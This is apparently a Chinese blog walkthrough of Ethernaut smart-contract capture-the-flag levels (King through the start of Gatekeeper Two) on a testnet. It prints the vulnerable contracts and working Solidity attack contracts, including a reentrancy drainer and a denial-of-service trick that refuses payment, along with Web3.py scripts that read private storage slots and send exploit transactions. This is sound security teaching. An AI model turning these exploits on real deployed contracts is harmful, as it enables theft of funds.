<p>用 Web3.py 连接 Sepolia，然后读一下插槽。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309082340847.png"
                      alt="image-20230908234018791"
                ></p>
<p>拿到了 password</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309081451828.png"
                      alt="image-20230908145153648"
                ></p>
<h2 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这题有点复杂，简单来说就像拍卖，谁价高谁是 king，但是当前出价会给到被推翻的 king。此外，当提交实例时，关卡将收回王权，要绕过这个东西。</p>
<p>看了一下，初始的出价为 0.001ETH 拿到 king 是没问题的，问题在于提交时的操作，绕过那个王权收回，没啥头绪。最后收回的操作应该是通过 owner 调用 receive() 实现的，收回后出价会变回0。</p>
<p>那么我们只需要在合约转账给被推翻的 king 时拒收，就可以阻止王权的收回了。</p>
<p>为此，我们需要一个攻击合约，普通的账户并不能拒收转账。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    address payable target;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.sender != target);</span><br><span class="line">        (bool success,) = target.call&#123;value: 0.0001 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Something went wrong&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意转账的方式：transfer() 和 send() 有2300的 gas 限制，所以要使用 call()。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310200456079.png"
                      alt="image-20231020045629006"
                ></p>
<h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10 Re-entrancy"></a>10 Re-entrancy</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是掏空合约余额。</p>
<p>标题为重入攻击，原理为：</p>
<p>用一句话来概括就是，攻击者会编写攻击智能合约，调用受害合约，利用自己的 Fallback 函数，循环调用一段受害者合约的代码。由于是因为重复进入受害者合约执行一段代码导致的漏洞，就叫做重入攻击。</p>
<p>本题在 withdraw 函数中采用了先转账后扣取余额的顺序，可以利用攻击合约的回调函数进行重入。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Reentrance public myReentrance;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) public &#123;</span><br><span class="line">        myReentrance = Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        myReentrance.donate&#123;value: msg.value&#125;(address(this));</span><br><span class="line">        myReentrance.withdraw(myReentrance.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(myReentrance).balance &gt;= 0.001 ether) &#123;</span><br><span class="line">            myReentrance.withdraw(0.001 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用 attack() 时 msg.value 必须大于等于 0.001ETH。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230142626.png"
                      alt="image-20231023014236563"
                ></p>
<h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>This elevator won’t let you reach the top of your building. Right?</p>
<p>这部电梯不会让你到达楼顶。对吧？</p>
<p>题目意思应该是要使 top 为 true。</p>
<p>题目中把 msg.sender 强制转换为 Building 接口的类型，即 msg.sender 必须是一个实现了 Building 接口的合约，至于使 top 为 true，写个函数骗过去就行了。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hacker is Building &#123;</span><br><span class="line">    Elevator public myelevator;</span><br><span class="line">    uint public n = 0;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myelevator = Elevator(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myelevator.goTo(114514);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint) external returns (bool) &#123;</span><br><span class="line">        if (n == 0) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            n = 0;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230249848.png"
                      alt="image-20231023024949802"
                ></p>
<h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看上去就是要把这些 private 的变量读取，然后调用 unlock() 使 locked 为 false，想到读 slot。</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>大小</th>
<th>插槽</th>
</tr>
</thead>
<tbody><tr>
<td>bool</td>
<td>1 Byte</td>
<td>Slot 0</td>
</tr>
<tr>
<td>uint256</td>
<td>32 Bytes</td>
<td>Slot 1</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint16</td>
<td>2 Bytes</td>
<td>Slot 2</td>
</tr>
<tr>
<td>bytes32[3]</td>
<td>96 Bytes</td>
<td>Slot 3, 4, 5</td>
</tr>
</tbody></table>
<p>经过对各个变量所用存储空间的计算，data[2] 存储于 slot5，上 python 脚本读吧。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"><span class="comment"># print(w3.is_connected())</span></span><br><span class="line"><span class="built_in">print</span>(w3.eth.get_storage_at(<span class="string">&#x27;0xDFA42F31cea9d624a9E794D809894D39b4F1fcA9&#x27;</span>, <span class="number">5</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>

<p>输出：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@fatbee-laptop:/mnt/c/Users/13246/web3<span class="comment"># python py/hack_12.py</span></span><br><span class="line">0x6b6077ff2045271ed9c281d35cb5762eebd69455f990d6d1677c384638a0c72b</span><br></pre></td></tr></table></figure></div>

<p>在使用 bytes16() 对 bytes32 进行强制类型转换的时候，64 位十六进制数会只剩下前面的 32 位，使用其作为 unlock() 的参数进行调用即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310241010622.png"
                      alt="image-20231024101040557"
                ></p>
<h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Remember what you’ve learned from the Telephone and Token levels.</li>
<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>).</li>
</ul>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>合约里面有三个函数修改器，满足这三个修改器里面的断言才能成功执行 enter 函数，那么沿着这些条件倒推就能找出 _gateKey 的值了。</p>
<p>关于 <a class="link"   href="https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types" >Solidity 类型转换 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><strong>gateThree_3</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里已知的部分是等号右边，tx.origin 即自己的地址，地址 address 类型是大小20字节的十六进制数，而 uint160 所占空间 160bits，即20字节，所以第一层类型转换不会出现信息丢失。</p>
<p>第二层类型转换是由 uint160 到 uint16，由大到小的类型转换必然会造成信息丢失，转换的具体情况：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint160(tx.origin): 0x42285Fb92421db39XXXXXXXXXX5f4B092bb0e411</span><br><span class="line">              (DEC: 377693759349744031XXXXXXXXXX57517436574663500817)</span><br><span class="line">uint16: 0xe411</span><br><span class="line">  (DEC: 58385)</span><br></pre></td></tr></table></figure></div>

<p>其实就是按照目标类型的大小，从右侧开始保留相应的数据，如上面保留2字节的数据。</p>
<p>以上的类型转换都是显式转换。等号的右边的数据类型是 uint16，左边是 uint32，那么两边在使用运算符计算的时候会进行隐式转换，且不造成信息丢失。</p>
<p>这里就是把 uint16 转换为 uint32，具体是在左侧补零，值保持不变。但是第一层是由 bytes8 转换至 uint64，看看如何转换。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint32(uint64(_gateKey)): 0x0000e411</span><br><span class="line">                    (DEC: 58385)</span><br><span class="line">uint64(_gateKey): 0x********0000e411</span><br><span class="line">            (DEC: Not sure)</span><br><span class="line">_gateKey: 0x********0000e411</span><br></pre></td></tr></table></figure></div>

<p>bytesN 类型只能转换为大小相同的 uint 类型，如上面的 bytes8 &#x3D;&gt; uint64，转换后无信息丢失。上面数据的星号可以用任意十六进制数代替。</p>
<p><strong>gateThree_2</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里比较好理解，由 uint64 到 uint32 的类型转换造成的信息丢失，又被 uint32 到 uint64 的隐式转换填充上了0，所以只需要往 _gateKey 的前半部分（星号部分）添加非0的数据即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_gateKey: 0x123456780000e411</span><br></pre></td></tr></table></figure></div>

<p>这样就能通过 gateThree 的第二部分。</p>
<p><strong>gateThree_1</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这里左半边结果是<code>0x0000e411</code>，右半边是<code>0xe411</code>，所以只要不对相差的那四个0做改变就好，因为右半边进行隐式转换后也会变成<code>0x0000e411</code>。</p>
<p><strong>gateTwo</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(gasleft() % 8191 == 0);</span><br></pre></td></tr></table></figure></div>

<p>这里要求剩余的 gas 必须是8191的整数倍，且不能为0，因为 Solidity 对0取模会报出 Panic 错误。</p>
<p>这里需要看实际消耗的 gas，所以要利用以太坊浏览器上链调试，写个初步的攻击合约看看：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>查看操作码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291626269.png"
                      alt="image-20231129162654806"
                ></p>
<p>看到整个过程中有两个 REVERT，其中第一个是目标合约 gateTwo 中触发的，顺着往上找到了 GAS。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291631672.png"
                      alt="image-20231129163152030"
                ></p>
<p>对 GAS 的解释是：在这条指令执行之后剩余的 gas，所以这里的 GAS 就是 gateTwo 中的 gasleft()，调一下 gas 就行。</p>
<p>这里把 GAS LIMIT 设置成819100，继续查看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291637508.png"
                      alt="image-20231129163727465"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291638236.png"
                      alt="image-20231129163801201"
                ></p>
<p>结果是780160，819100-780160&#x3D;38940，即为运行到 gasleft() 处花费的 gas。所以我们提供819100+38940&#x3D;858040的 gas 即可通过 gateTwo</p>
<p>。。。吗？</p>
<p>首先上文我犯了个错误，gasleft() 返回值为执行完 GAS 后的剩余 gas 值，所以我们参考的值应该为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291651820.png"
                      alt="image-20231129165123779"
                ></p>
<p>其次，即使我们参考正确的 gas 值进行计算得出理论上正确的 gas limit（858042），也无济于事</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20231129165531255.png"
                      alt="image-20231129165531255"
                ></p>
<p>看这个小玩意，问题出在这里，使用 Txn Type 2 会导致 gas 费用是动态的，简单来说是会给到矿工合适的小费，这个“合适”并不固定，所以一直算不准。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311292140786.png"
                      alt="image-20231129214045743"
                ></p>
<p>关于 <a class="link"   href="https://blog.csdn.net/feeltouch/article/details/124975358" >EIP-1559 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>由于 Txn Type 0 的交易并不会定义 maxFee 和 maxPriority，即提供多少 gas 是固定的，那么发送这种类型的交易即可。</p>
<p>。。。吗？</p>
<p>猜测：实际上由于 gasPrice 的变化，即使使用 Type 0 也无济于事，只能减少它的浮动范围罢了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300207236.png"
                     
                ></p>
<p>结果：把 gas 固定在100000进行测试，每次都一样，从调用直到 GAS 操作码执行完毕消耗27706，把 gas 增加至819100，测试下，到 GAS 之后稳定消耗38942。实在是找不出导致这种现象的原因，一步一步调着先吧，最终调试出 gas 为858660时可以稳定成功。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312620.png"
                      alt="image-20231130031208573" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300312156.png"
                      alt="image-20231130031249102"
                ></p>
<p>这里连续执行了5次，都是成功的。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用于调用攻击合约方法的 python 脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sender_address = <span class="string">&#x27;SENDER_ADDRESS&#x27;</span></span><br><span class="line">recipient_address = <span class="string">&#x27;RECIPIENT_ADDRESS&#x27;</span></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">&#x27;YOUR_PRIVATE_KEY&#x27;</span></span><br><span class="line"></span><br><span class="line">transaction_params = &#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: recipient_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: <span class="number">0x9e5faafc</span>,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: web3.eth.get_transaction_count(sender_address),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">858660</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.eth.gas_price,</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">transaction = web3.eth.account.sign_transaction(transaction_params, private_key)</span><br><span class="line">transaction_hash = web3.eth.send_raw_transaction(transaction.rawTransaction)</span><br><span class="line">transaction_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> transaction_receipt.status:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction successful!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction failed.&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>我也不知道为什么我要写个 py 脚本来调用攻击合约，本来全部东西都可以写进合约里面的，但是我开始有写循环的想法就下意识去用 Web3.py 了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300321502.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300323303.png"
                      alt="image-20231130032336251"
                ></p>
<h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14 Gatekeeper Two"></a>14 Gatekeeper Two</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a class="link"   href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a class="link"   href="https://ethereum.github.io/yellowpaper/paper.pdf" >yellow paper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</li>
<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a class="link"   href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
</ul>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>gateOne</strong>：</p>
<p>这题的 gateOne 与上一关相同。</p>
<p><strong>gateTwo</strong>：</p>
